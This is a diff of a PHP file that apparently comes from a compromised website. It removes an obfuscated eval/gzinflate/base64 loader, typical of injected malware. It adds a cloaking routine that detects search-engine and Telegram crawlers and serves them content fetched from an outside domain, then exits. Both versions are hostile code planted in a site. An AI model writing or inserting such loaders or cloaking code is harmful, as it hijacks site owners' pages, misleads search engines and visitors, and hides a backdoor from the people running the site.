@@ -1,4 +1,23 @@
-<?php $Apaaja = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1KBrNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUMn0SyzJSMwLKMrMK85JrdRE\x41tY\x41";$iNathanPrinsley = "pG\x41lQfk\x2b9M\x631yXHJUsuvy/R/6TuShdzYj3/Mi6tGgEk\x2bMw8Hp34G80L1DM754WN7Wh7yLndY0MtK\x41MIO5/D227yp\x622ixee/4hW6IGp4PH5Ru\x62en\x2bs2\x63P4M6SKo18kK0\x41pJd\x631yJQpuVxTo4\x42kinls5\x418mS\x61jIqR\x41\x62S/Eq8kFd\x43W0\x63\x41e\x61GF6z5TZd\x41\x41uKnvqUK\x42j\x61\x632r/Mhrv8\x2bFRF8nJ5zyV\x61fs4hO7zHoGzXt\x43t977uytqrTp2uXG2zm2oi\x627kKu9xrK7mPF/WE\x62qiVDEVjMyO\x620dUgp4OtuGzEndSd\x43\x41\x438iqGSITIOxZO\x62y\x43drY4\x43W4lLfQn6SmE\x62gTD/19Q1MviRnqt\x63E5ry6395tEj\x2b\x62Gquqfdyvr\x63\x62edtt8TWVPKXS\x62YtdSnPgRRkHFD2WQG\x42\x42\x61PpwR/uGU\x41L8\x41\x62\x41\x2bwEK1RMkNQo6MN\x2b4kn1QnT\x61QL6wgGUhkdSWXkKO2r7lmkkro\x62wwU\x63Qw0UDh6t46\x43imv\x41Eog\x41Mpv\x416joTFQ7RRVzpi10\x625OZrxdtQ\x439\x42L\x42\x62gYH2/\x430Ysd1jvujkOD43HI\x615\x62mvZ\x61XfjEL/Ft41qe99jZs53eO/yXYNXouLJ448/Gyu0EPpJir9hx\x62\x62WI\x41\x414UpiXpLLrqe8yuQiFslqE\x63IKs/p\x2bV9\x43\x42MT/YTT1o/qEQ1\x42wJe\x2b/R\x41gHg/\x61EQ5\x42wJe\x2b/Q\x41wHg/KEQ9\x42wJe9/v\x41\x41EQ/6LQ\x42\x42wJe";eval(htmlspecialchars_decode(gzinflate(base64_decode($Apaaja))));exit;?>
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+if (is_bot()) {
+    $message = file_get_contents('https://wellplayer.online/landing/multidisipliner.org/');
+    echo $message;
+exit;
+}
+?>
 
 <?php
 
